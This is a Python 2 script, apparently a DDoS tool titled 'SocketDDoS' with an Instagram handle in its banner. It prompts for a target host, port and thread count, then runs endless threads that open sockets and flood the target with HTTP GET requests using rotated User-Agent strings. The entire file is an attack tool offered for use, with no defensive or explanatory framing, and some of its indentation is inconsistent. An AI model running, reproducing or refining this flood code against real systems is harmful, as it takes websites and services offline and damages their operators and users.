import threading
import random
import sys
import socket
import time

print ("\033[31m   ____         __       __  ___  ___       ____ \033[0m")
print ("\033[31m  / __/__  ____/ /_____ / /_/ _ \/ _ \___  / __/ \033[0m")
print ("\033[31m _\ \/ _ \/ __/  '_/ -_) __/ // / // / _ \_\ \   \033[0m")
print ("\033[31m/___/\___/\__/_/\_\\__/\__/____/____/\___/___/   \033[0m")
print ("\033[33m                     Instagram : @bossy.078 \033[0m")                                               
print (" ")
url = raw_input("\033[93m [+] Host / IP : \033[1m")
port = input("\033[94m [+] Port : \033[1m")
thread_num = input("\033[95m [+] Threads : \033[1m")
print (" ")

url2 = "/"

useragents=["Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 6.0.1; HTCD160LVWPP Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.124 Mobile Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A",
            "Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
            "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
            "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
            "Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16",
            "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
            "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",]

def run():
	if len(sys.argv)>=1:
		get_host = "GET " + url2 + " HTTP/1.1\r\nHost: " + url + "\r\n"
		acceptall = ["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n", "Accept-Encoding: gzip, deflate\r\n", "Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"]
		connection = "Connection: Keep-Alive\r\n"
		useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
		accept = random.choice(acceptall)
		request = get_host + useragent + accept + connection + "\r\n"
        while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				s.connect((str(url), int(port)))
				s.send (str.encode(request))
				print "\033[94m",time.ctime(time.time()),"\033[0m \033[92m [+] Package Sent ! \033[0m"
			except:
				s.close()
				print "\033[94m",time.ctime(time.time()),"\033[0m \033[91m [!] Error , Socket Closed \033[0m"


	else:
		print "\033[94m",time.ctime(time.time()),"\033[0m \033[91m [!] It Only Work On Http Server ! \033[0m"

for i in range(thread_num):
    th = threading.Thread(target = run)
    th.start()
